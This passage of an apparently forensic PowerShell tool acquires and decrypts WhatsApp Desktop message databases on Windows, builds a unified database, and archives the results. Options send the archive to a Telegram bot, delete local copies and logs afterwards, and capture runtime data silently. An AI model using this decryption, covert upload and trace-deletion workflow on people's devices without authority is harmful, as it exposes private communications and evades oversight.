                    Write-Warning "  Python installer exited with code $($proc.ExitCode)."
                    return $false
                }
            }
            catch {
                Write-Warning "  Failed to run Python installer: $($_.Exception.Message)"
                return $false
            }
            finally {
                Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
            }

            # Refresh PATH in current session so we can find the new install
            $machinePath = [System.Environment]::GetEnvironmentVariable("PATH", "Machine")
            $userPath = [System.Environment]::GetEnvironmentVariable("PATH", "User")
            $env:PATH = "$machinePath;$userPath"

            Write-Host "  Python $pyVersion installed successfully."
            return $true
        }

        # -- Helper: Embedded/portable Python fallback -------------------------
        function Get-EmbeddedPython {
            $embedVersion = "3.12.4"
            $embedZipUrl = "https://www.python.org/ftp/python/$embedVersion/python-$embedVersion-embed-amd64.zip"
            $embedDir = Join-Path $PSScriptRoot "python_embedded"
            $embedExe = Join-Path $embedDir "python.exe"

            if (Test-Path $embedExe) {
                Write-Host "  Using existing embedded Python at: $embedDir"
                return $embedExe
            }

            if (-not $OnlineBootstrap) {
                Write-Warning "  Embedded Python not found and online bootstrap is disabled."
                return $null
            }

            Write-Host "  Downloading embedded Python $embedVersion..."
            $zipPath = Join-Path $env:TEMP "python-embed-amd64.zip"
            try {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($embedZipUrl, $zipPath)
            }
            catch {
                Write-Warning "  Failed to download embedded Python: $($_.Exception.Message)"
                return $null
            }

            Write-Host "  Extracting embedded Python..."
            try {
                New-Item -ItemType Directory -Force -Path $embedDir | Out-Null
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $embedDir)
            }
            catch {
                Write-Warning "  Failed to extract embedded Python: $($_.Exception.Message)"
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                return $null
            }
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

            # Enable pip in embedded Python (uncomment the import site line in pth file)
            $pthFile = Get-ChildItem "$embedDir\python*._pth" -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($pthFile) {
                $content = Get-Content $pthFile.FullName
                $content = $content -replace '#\s*import site', 'import site'
                Set-Content -Path $pthFile.FullName -Value $content
            }

            # Bootstrap pip
            $getPipUrl = "https://bootstrap.pypa.io/get-pip.py"
            $getPipPath = Join-Path $embedDir "get-pip.py"
            try {
                (New-Object System.Net.WebClient).DownloadFile($getPipUrl, $getPipPath)
                & $embedExe $getPipPath --no-warn-script-location 2>&1 | Out-Null
                Remove-Item $getPipPath -Force -ErrorAction SilentlyContinue
            }
            catch {
                Write-Warning "  Failed to bootstrap pip for embedded Python: $($_.Exception.Message)"
            }

            if (Test-Path $embedExe) {
                Write-Host "  Embedded Python ready at: $embedDir"
                return $embedExe
            }
            return $null
        }

        $sectionWatch.Stop()
        Write-WAren6Output "+-- (Completed in $($sectionWatch.Elapsed.TotalSeconds.ToString('F1'))s) ----------------------------------+"
        Write-WAren6Output ""
        $sectionWatch.Restart()
        Write-WAren6Output "+-- [3/4] Unified Database Extractor ------------------------+"
        Write-WAren6Output "  [>] Resolving Python environment..."
        $pythonExe = Resolve-PythonExe

        if (-not $pythonExe -and $OnlineBootstrap) {
            Write-WAren6Output "  [>] Python not found on PATH. Attempting silent download/installation..."
            $installOk = Install-PythonSilently
            if ($installOk) {
                $pythonExe = Resolve-PythonExe
            }
        }

        if (-not $pythonExe) {
            Write-WAren6Output "  [!] System Python unavailable."
            Write-WAren6Output "  [>] Trying embedded Python..."
            $pythonExe = Get-EmbeddedPython
        }

        if (-not $pythonExe) {
            Write-Warning "All Python resolution strategies failed. Unified database will not be built."
            Write-Warning "Unification can be completed later with: python waren6.py --unify `"$targetOutput`""
            Write-WAren6UnifyLater -CasePath $targetOutput -WithMedia:$WithMedia | Out-Null
        }
        else {
            # -- Ensure ccl_chromium_reader dependency is installed -------------
            Write-WAren6Output "  [>] Verifying dependencies (ccl_chromium_reader)..."
            & $pythonExe -c "import ccl_chromium_reader" 2>$null
            if ($LASTEXITCODE -ne 0) {
                $wheelsDir = Join-Path $PSScriptRoot "wheels"
                if (Test-Path -LiteralPath $wheelsDir) {
                    Write-WAren6Output "  [>] Missing dependency. Installing from local wheels..."
                    & $pythonExe -m pip install --quiet --no-index --find-links $wheelsDir ccl_chromium_reader 2>&1 | Out-Null
                }
                elseif ($OnlineBootstrap) {
                    Write-WAren6Output "  [!] Missing dependency. Online bootstrap enabled; installing from source..."
                    & $pythonExe -m pip install --quiet --user git+https://github.com/cclgroupltd/ccl_chromium_reader.git 2>&1 | Out-Null
                }
                else {
                    Write-Warning "ccl_chromium_reader is missing and no local wheels directory exists. Unified DB will not be built."
                    $pythonExe = $null
                }

                if ($pythonExe) {
                    & $pythonExe -c "import ccl_chromium_reader" 2>$null
                }
                if ($LASTEXITCODE -ne 0) {
                    Write-Warning "Failed to load ccl_chromium_reader. Unified DB will not be built."
                    $pythonExe = $null
                }
            }
        }

        $pythonAttempted = $false
        $pythonFailed = $false
        if ($pythonExe) {
            $pythonAttempted = $true
            Write-WAren6Output "  [>] Spawning Python waren6.py... (See Python output below)"
            Write-WAren6Output "  ------------------------------------------------------------"
            $validationReportPath = Join-Path $targetOutput "validation_report.json"
            $reportsDir = Join-Path $targetOutput "reports"
            $store8DebugReports = [bool]($Store8CryptoResearch -or $OpaqueSaltFile)
            $cryptoArtifactsReport = if ($store8DebugReports) { Join-Path $targetOutput "opaque_crypto_artifacts.json" } else { $null }
            $store8CryptoProfile = if ($store8DebugReports) { Join-Path $targetOutput "store8_crypto_profile.json" } else { $null }
            $store8DecryptionReport = if ($store8DebugReports) { Join-Path $targetOutput "store8_decryption_report.json" } else { $null }
            $store8SaltHuntReport = if ($store8DebugReports) { Join-Path $targetOutput "store8_salt_hunt_report.json" } else { $null }
            $pythonArgs = @(
                "-u",
                $waExtractScript,
                "--idb-path", $idbDest,
                "--decrypted-dir", $targetOutput,
                "--output", $unifiedDb,
                "--validation-report", $validationReportPath,
                "--no-progress",
                "--report-timezone", $ReportTimezone,
                "--tool-version", $global:WAren6Version
            )
            if ($GenerateReports) {
                $pythonArgs += @(
                    "--reports-dir", $reportsDir,
                    "--report-formats", "html,jsonl,csv,tsv,pdf",
                    "--report-scope", "all"
                )
            }
            if ($store8DebugReports) {
                $pythonArgs += @(
                "--store8-debug",
                "--crypto-artifacts-report", $cryptoArtifactsReport,
                "--store8-crypto-profile", $store8CryptoProfile,
                "--store8-decryption-report", $store8DecryptionReport,
                "--store8-salt-hunt-report", $store8SaltHuntReport
                )
            }
            if ($Store8CryptoResearch) {
                $pythonArgs += "--profile-store8-crypto"
                $pythonArgs += "--decrypt-store8-opaque"
                $pythonArgs += "--hunt-opaque-salt"
                if ($idbDest -and (Test-Path $idbDest)) {
                    $pythonArgs += @("--opaque-artifact-path", $idbDest)
                }
                foreach ($artifactDir in @("logq", "rotatedLogs")) {
                    $artifactPath = Join-Path $targetOutput $artifactDir
                    if (Test-Path $artifactPath) {
                        $pythonArgs += @("--opaque-artifact-path", $artifactPath)
                    }
                }
            }
            if ($OpaqueSaltFile) {
                $pythonArgs += @("--opaque-salt-file", $OpaqueSaltFile, "--decrypt-store8-opaque")
            }
            if ($RuntimeStore8Jsonl) {
                $pythonArgs += @("--runtime-store8-jsonl", $RuntimeStore8Jsonl)
            }
            if ($WithMedia) {
                $pythonArgs += "--with-media-index"
                $pythonArgs += @("--media-index-report", (Join-Path $targetOutput "media_index_report.json"))
            }
            & $pythonExe @pythonArgs 2>&1 | ForEach-Object {
                $line = $_
                Write-WAren6Output (Protect-WAren6PathText -Text ([string]$line) -CaseRoot $targetOutput)
            }
            $pythonExitCode = $LASTEXITCODE

            Write-WAren6Output "  ------------------------------------------------------------"
            if ($pythonExitCode -eq 0 -and (Test-Path $unifiedDb)) {
                $modeInfo.pythonUnified = $true
                Write-WAren6Output "  [OK] Unified data processed successfully: unified_whatsapp.db"
                if (Test-Path $validationReportPath) {
                    Write-WAren6Output "  [OK] Validation report generated: validation_report.json"
                    if ($RuntimeStore8Jsonl -and $modeInfo.runtimeSupplement) {
                        try {
                            $validationJson = Get-Content -Raw -LiteralPath $validationReportPath | ConvertFrom-Json
                            $runtimeSummary = $validationJson.runtime_store8_supplement
                            $usableRecords = [int]($runtimeSummary.usable_records)
                            $recordsWithText = [int]($runtimeSummary.records_with_text)
                            $modeInfo.runtimeSupplement.usableRecords = $usableRecords
                            $modeInfo.runtimeSupplement.recordsWithText = $recordsWithText
                            $modeInfo.runtimeSupplement.warnings = @($runtimeSummary.warnings)
                            if ($usableRecords -gt 0) {
                                $modeInfo.runtimeSupplement.status = "captured"
                                Write-WAren6Output "  [OK] Runtime Store 8 supplement loaded: $usableRecords usable records."
                            }
                            else {
                                $modeInfo.runtimeSupplement.status = "captured_unusable"
                                Write-Warning "Runtime Store 8 supplement was present but Python loaded 0 usable records."
                            }
                        }
                        catch {
                            $modeInfo.runtimeSupplement.status = "captured_unusable"
                            Write-Warning "Unable to inspect runtime supplement validation status: $($_.Exception.Message)"
                        }
                    }
                }
                if ($store8CryptoProfile -and (Test-Path $store8CryptoProfile)) {
                    Write-WAren6Output "  [OK] Store 8 crypto profile generated: store8_crypto_profile.json"
                }
                if ($store8DecryptionReport -and (Test-Path $store8DecryptionReport)) {
                    Write-WAren6Output "  [OK] Store 8 decryption report generated: store8_decryption_report.json"
                }
                if ($store8SaltHuntReport -and (Test-Path $store8SaltHuntReport)) {
                    Write-WAren6Output "  [OK] Store 8 salt hunt report generated: store8_salt_hunt_report.json"
                }
            }
            else {
                $pythonFailed = $true
                Write-Warning "  [X] waren6.py exited with error code: $pythonExitCode"
            }
        }

    }
    else {
        if (-not (Test-Path $waExtractScript)) {
            Write-Warning "  [!] waren6.py not found - skipping unified DB."
        }
        elseif (-not $idbDest) {
            Write-Warning "  [!] IndexedDB was not acquired - skipping unified DB."
        }
    }

    $sectionWatch.Stop()
    Write-WAren6Output "+-- (Completed in $($sectionWatch.Elapsed.TotalSeconds.ToString('F1'))s) ----------------------------------+"
    Write-WAren6Output ""
    $sectionWatch.Restart()
    Write-WAren6Output "+-- [4/4] Archiving & Cleanup -------------------------------+"

    $archiveBaseName = "WAren6_$reverseDate"
    $archivePath = $null
    $archiveInfo = $null
    $checksumFileArchive = $null
    $manifestPath = $null
    $rootManifestPath = Join-Path $OutputDirectory "$archiveBaseName.manifest.json"
    $caseFileInventory = $null
    $telegramResult = $null
    $caseDirectoryRemoved = $false
    $unifiedDbWasBuilt = $false

    if (Test-Path -LiteralPath $targetOutput) {
        Sync-WAren6CaseLog -CasePath $targetOutput | Out-Null
        Write-WAren6Output "  [>] Writing pre-archive forensic manifest..."
        $caseFileInventory = Get-WAren6FileInventory -RootPath $targetOutput -ExcludeRelativePaths @("WAren6.manifest.json")
        Write-WAren6Manifest `
            -CasePath $targetOutput `
            -OutputDirectory $OutputDirectory `
            -ValidationReportPath $validationReportPath `
            -CommandLine (Protect-WAren6CommandLine -CommandLine ([Environment]::CommandLine)) `
            -ModeInfo $modeInfo `
            -PrecomputedFiles $caseFileInventory | Out-Null
    }

    Write-WAren6Output "  [>] Compressing extraction directory..."
    try {
        $archiveInfo = New-WAren6CaseArchive -Source $targetOutput -OutputDirectory $OutputDirectory -BaseName $archiveBaseName
        $archivePath = $archiveInfo.Path
        Write-WAren6Output "  [OK] Archive generated: $(Split-Path -Path $archivePath -Leaf)"
    }
    catch {
        Write-Error "Archive creation failed: $($_.Exception.Message)"
        Stop-WAren6Log
        return
    }

    # Generate integrity HASH
    Write-WAren6Output "  [>] Calculating SHA-256 Checksum..."
    $checksumFileArchive = Get-SHA256Checksum -FilePath $archivePath -Sha256Hash $archiveInfo.Sha256
    if ($checksumFileArchive) {
        Write-Verbose "Checksum file (archive): $checksumFileArchive"
    }
    Write-WAren6Output "  [OK] SHA-256: $checksumFileArchive"

    if (Test-Path -LiteralPath $targetOutput) {
        Sync-WAren6CaseLog -CasePath $targetOutput | Out-Null
        Write-WAren6Output "  [>] Writing forensic manifest..."
        $manifestPath = Write-WAren6Manifest `
            -CasePath $targetOutput `
            -OutputDirectory $OutputDirectory `
            -ArchivePath $archivePath `
            -ArchiveInfo $archiveInfo `
            -ValidationReportPath $validationReportPath `
            -CommandLine (Protect-WAren6CommandLine -CommandLine ([Environment]::CommandLine)) `
            -ModeInfo $modeInfo `
            -PrecomputedFiles $caseFileInventory
        Write-WAren6Output "  [OK] Manifest: $manifestPath"
        Sync-WAren6CaseLog -CasePath $targetOutput | Out-Null
    }

    if ($TelegramBotToken) {
        if (-not $TelegramChatId) {
            Write-Warning "Telegram bot token was supplied without -cid/--chat-id. Skipping transfer and local auto-delete."
            $telegramResult = [PSCustomObject]@{ success = $false; error = "missing chat id"; generatedPaths = @() }
        }
        else {
            $telegramResult = Invoke-WAren6TelegramTransfer `
                -BotToken $TelegramBotToken `
                -ChatId $TelegramChatId `
                -ArchivePath $archivePath `
                -OutputDirectory $OutputDirectory `
                -BaseName $archiveBaseName `
                -EncryptPassword $TelegramEncryptPassword `
                -ApiBase $TelegramApiBase `
                -LogPath $script:WAren6LogPath
            if ($telegramResult.success) {
                Write-WAren6Output "  [OK] Telegram transfer verified."
            }
        }
    }

    if ($TelegramAutoDelete -and $telegramResult.success) {
        $deletePaths = @()
        $autoDeleteCandidates = @(
            $archivePath,
            $checksumFileArchive,
            $manifestPath,
            $rootManifestPath,
            $runtimeCaptureRoot,
            $script:WAren6LogPath
        )
        if (-not $pythonFailed) {
            $autoDeleteCandidates = @($targetOutput) + $autoDeleteCandidates
        }
        foreach ($candidate in $autoDeleteCandidates) {
            if ($candidate) {
                $deletePaths += $candidate
            }
        }
        if ($telegramResult.generatedPaths) {
            foreach ($candidate in @($telegramResult.generatedPaths)) {
                if ($candidate) {
                    $deletePaths += $candidate
                }
            }
        }
        Stop-WAren6Log
        if ($deletePaths.Count -gt 0) {
            Invoke-WAren6VerifiedAutoDelete -Paths $deletePaths | Out-Null
        }
        $script:WAren6LogPath = $null
        Write-WAren6Output "  [OK] Auto-delete completed after verified Telegram upload."
        if ($pythonFailed) {
            Write-WAren6Output "  [>] Unfinished case folder kept locally for later --unify."
        }
    }
    elseif ($TelegramAutoDelete -and $TelegramBotToken) {
        Write-Warning "Auto-delete skipped because Telegram upload did not fully verify."
    }

    $unifiedDbWasBuilt = [bool]$modeInfo.pythonUnified
    if ($pythonFailed) {
        Write-Warning "Unified DB was not completed. Keeping extracted case folder for inspection and re-run."
    }
    if ($DeleteCaseDirectoryAfterArchive -and -not $pythonFailed -and -not ($TelegramAutoDelete -and $telegramResult.success)) {
        Sync-WAren6CaseLog -CasePath $targetOutput | Out-Null
        $caseDirectoryRemoved = Remove-WAren6CaseDirectoryAfterArchive -CasePath $targetOutput -ArchivePath $archivePath
        if ($caseDirectoryRemoved) {
            Write-WAren6Output "  [OK] Cleaned extracted case folder after verified archive."
        }
    }

    # NOTE: WhatsApp restart disabled to avoid new window spawning
    if ($wasWhatsAppRunning) {
        Write-WAren6Output "  [!] WhatsApp was closed for acquisition. Restart manually."
    }

    $sectionWatch.Stop()
    Write-WAren6Output "+-- (Completed in $($sectionWatch.Elapsed.TotalSeconds.ToString('F1'))s) ----------------------------------+"
    Write-WAren6Output ""
    $globalWatch.Stop()

    # Final Summary Table
    Write-WAren6Output "+------------------------------------------------------------+"
    if ($pythonFailed) {
        Write-WAren6Output "|                   EXTRACTION INCOMPLETE                    |"
    }
    else {
        Write-WAren6Output "|                    EXTRACTION COMPLETE                     |"
    }
    Write-WAren6Output "+------------------------------------------------------------+"
    Write-WAren6Output "| Archive:          $(if ($archivePath) { Split-Path -Path $archivePath -Leaf } else { '<not generated>' })"
    if ($unifiedDbWasBuilt) {
        if ($caseDirectoryRemoved) {
            Write-WAren6Output "| Access DB:        extract archive, then open unified_whatsapp.db"
        }
        else {
            Write-WAren6Output "| Access DB:        unified_whatsapp.db (Use SQLite Browser) "
        }
    }
    elseif ($pythonAttempted) {
        Write-WAren6Output "| Access DB:        not built; see Python error above"
    }
    if ($caseDirectoryRemoved) {
        Write-WAren6Output "| Case folder:      cleaned after archive verification"
    }
    elseif ($pythonFailed) {
        Write-WAren6Output "| Case folder:      kept for inspection"
    }
    if ($telegramResult -and $telegramResult.success) {
        Write-WAren6Output "| Telegram:         uploaded and verified"
    }
    Write-WAren6Output "| Integrity (SHA):  $checksumFileArchive"
    Write-WAren6Output "| Total Time:       $($globalWatch.Elapsed.TotalSeconds.ToString('F1')) seconds"
    Write-WAren6Output "+------------------------------------------------------------+"
    Write-WAren6Output ""
    Stop-WAren6Log
    if ($pythonFailed) {
        exit 1
    }
}

if ($Doctor) {
    Invoke-WAren6Doctor `
        -WhatsAppPath $WhatsAppPath `
        -OutputPath $OutputPath `
        -NoNet:$NoNet
    $doctorExit = if ($null -ne $script:WAren6DoctorExit) { $script:WAren6DoctorExit } else { 1 }
    exit $doctorExit
}

if ($DryRun) {
    $dryMode = Get-WAren6ModeLabel -UnifyOnly:$UnifyOnly -RuntimeOnly:$RuntimeOnly -AcquireOnly:$AcquireOnly -OfflineMode:$OfflineMode -Hybrid:$Hybrid
    $dryNetwork = Get-WAren6NetworkLabel -OnlineBootstrap:$OnlineBootstrap -OfflineMode:$OfflineMode -Hybrid:$Hybrid -RuntimeOnly:$RuntimeOnly
    $drySource = ""
    $dryOutput = ""

    if ($UnifyOnly) {
        $drySource = if ($CasePath) { $CasePath } else { "<missing --case>" }
        $dryOutput = "existing case output"
    }
    elseif ($RuntimeOnly) {
        $drySource = "WhatsApp runtime"
        $dryOutput = if ($CasePath) { $CasePath } else { Join-Path $PWD.Path ("WAren6_runtime_" + (Get-Date -Format "yyyyMMddHHmmss")) }
    }
    elseif ($GetID) {
        $drySource = "local Windows ODUID"
        $dryOutput = "console"
    }
    else {
        if ($PSBoundParameters.ContainsKey('WhatsAppPath')) {
            $drySource = $WhatsAppPath
        }
        else {
            $autoPath = Get-AppLocalStatePath -AppName "WhatsApp"
            $drySource = if ($autoPath) { $autoPath } else { "<WhatsApp LocalState auto-detect failed>" }
        }
        $dryRoot = if ($PSBoundParameters.ContainsKey('OutputPath')) { $OutputPath } else { $PWD.Path }
        $dryOutput = Join-Path $dryRoot ("WAren6_" + (Get-Date -Format "yyyyMMddHHmmss"))
    }

    Write-WAren6CommandSummary `
        -Mode $dryMode `
        -WithMedia ([bool]$WithMedia) `
        -Network $dryNetwork `
        -Source $drySource `
        -Output $dryOutput `
        -DryRun

    if ($TelegramBotToken) {
        $dryTransfer = if ($TelegramEncryptPassword) { "Telegram transfer on, archive encrypted, split only if over cloud limit" } else { "Telegram transfer on, split only if over cloud limit" }
        Write-WAren6Output "Transfer: $dryTransfer"
        if ($TelegramAutoDelete) {
            Write-WAren6Output "Auto-delete: enabled only after verified Telegram upload."
        }
    }
    if ($script:WAren6LegacyCliFlags.Count -gt 0) {
        Write-WAren6Output "Legacy flags accepted this release: $($script:WAren6LegacyCliFlags -join ', ')"
    }
    Write-WAren6Output "Dry run only. WAren6 did not open WhatsApp, close WhatsApp, copy evidence, decrypt databases, install dependencies, or write case output."
    exit 0
}

if ($UnifyOnly) {
    if (-not $CasePath) {
        Write-WAren6Output "The --case argument is required with --unify."
        exit 1
    }
    $resolvedCase = if (Test-Path -LiteralPath $CasePath) { (Resolve-Path -LiteralPath $CasePath).Path } else { $CasePath }
    Write-WAren6CommandSummary `
        -Mode (Get-WAren6ModeLabel -UnifyOnly) `
        -WithMedia ([bool]$WithMedia) `
        -Network (Get-WAren6NetworkLabel -OnlineBootstrap:$OnlineBootstrap) `
        -Source $resolvedCase `
        -Output "existing case output"
    $ok = Invoke-WAren6Unify `
        -CasePath $resolvedCase `
        -RuntimeStore8Jsonl $RuntimeStore8Jsonl `
        -WithMedia:$WithMedia `
        -ReportTimezone $ReportTimezone `
        -GenerateReports:$GenerateReports `
        -OnlineBootstrap:$OnlineBootstrap
    if (-not $ok) { exit 1 }
    exit 0
}
elseif ($RuntimeOnly) {
    if (-not $CasePath) {
        $CasePath = Join-Path $PWD.Path ("WAren6_runtime_" + (Get-Date -Format "yyyyMMddHHmmss"))
    }
    Write-WAren6CommandSummary `
        -Mode (Get-WAren6ModeLabel -RuntimeOnly) `
        -WithMedia $false `
        -Network (Get-WAren6NetworkLabel -OnlineBootstrap:$OnlineBootstrap -RuntimeOnly) `
        -Source "WhatsApp runtime" `
        -Output $CasePath
    New-Item -ItemType Directory -Force -Path $CasePath | Out-Null
    try {
        $runtimeHidden = -not $ForegroundRuntime
        $runtimePath = Invoke-WAren6RuntimeStore8Capture -OutputDirectory $CasePath -Silent:$runtimeHidden -BlockClose:$ForegroundRuntime
        Write-WAren6Output "Runtime Store 8 JSONL: $runtimePath"
        exit 0
    }
    catch {
        Write-Warning "Runtime capture failed: $($_.Exception.Message)"
        exit 1
    }
}

elseif ($PSBoundParameters.ContainsKey('GetID')) {
    $ODUID = Get-OfflineDeviceUniqueID -Salt $global:getODUID_salt
    $ODUID_HEX = ConvertTo-HexString $ODUID.ID
    $oduidFingerprint = Format-WAren6SecretFingerprint -Bytes $ODUID.ID
    if ($ShowSecretId) {
        $rawOduidLine = "ODUID: $ODUID_HEX"
        Write-WAren6Output $rawOduidLine
    }
    else {
        Write-WAren6Output "ODUID: [redacted; sha256:$oduidFingerprint]"
        Write-WAren6Output "Raw ODUID hidden. Re-run with --get-id --show-secret-id only if you explicitly need it."
    }
}

else {
    if (-not $PSBoundParameters.ContainsKey('WhatsAppPath')) {
        $WhatsAppPath = Get-AppLocalStatePath -AppName "WhatsApp"
        if ($null -eq $WhatsAppPath) {
            Write-WAren6Output "WhatsApp installation path not found on this PC. If you are attempting to process a standalone directory structure, please use the -WhatsApp argument."
            exit
        }
    }
    else {
        $WhatsAppPath = (Resolve-Path $WhatsAppPath).Path
    }
    if (-not $PSBoundParameters.ContainsKey('OutputPath')) {
        Set-Variable -Name OutputDirectory -Value $PWD.Path -Scope Global
    }
    else {
        Set-Variable -Name OutputDirectory -Value $OutputPath -Scope Global
    }
    if ($PSBoundParameters.ContainsKey('Offline') -and [string]::IsNullOrWhiteSpace($ID)) {
        Write-WAren6Output "The legacy -Offline flag requires --id <oduid-hex>. Use --offline without --id for local evidence-only extraction."
        exit 1
    }
    $effectiveDeleteCaseDirectoryAfterArchive = -not $KeepCaseDirectoryAfterArchive
    if ($DeleteCaseDirectoryAfterArchive) {
        $effectiveDeleteCaseDirectoryAfterArchive = $true
    }
    if ($KeepCaseDirectoryAfterArchive -and $DeleteCaseDirectoryAfterArchive) {
        Write-Warning "--keep-case-folder was supplied with --delete-case-directory-after-archive; keeping the case folder."
        $effectiveDeleteCaseDirectoryAfterArchive = $false
    }
    Start-WAren6 `
        -WhatsAppPath $WhatsAppPath `
        -UseSuppliedODUID:$script:WAren6UseSuppliedODUID `
        -ID $ID `
        -OutputPath $OutputDirectory `
        -OnlineBootstrap:$OnlineBootstrap `
        -OfflineMode:$OfflineMode `
        -DeleteCaseDirectoryAfterArchive:$effectiveDeleteCaseDirectoryAfterArchive `
        -TelegramBotToken $TelegramBotToken `
        -TelegramChatId $TelegramChatId `
        -TelegramAutoDelete:$TelegramAutoDelete `
        -TelegramEncryptPassword $TelegramEncryptPassword `
        -TelegramApiBase $TelegramApiBase `
        -ReportTimezone $ReportTimezone `
        -Store8CryptoResearch:$Store8CryptoResearch `
        -OpaqueSaltFile $OpaqueSaltFile `
        -RuntimeStore8Jsonl $RuntimeStore8Jsonl `
        -WithMedia:$WithMedia `
        -Hybrid:$Hybrid `
        -AcquireOnly:$AcquireOnly `
        -GenerateReports:$GenerateReports `
        -Silent:$Silent `
        -ForegroundRuntime:$ForegroundRuntime
}

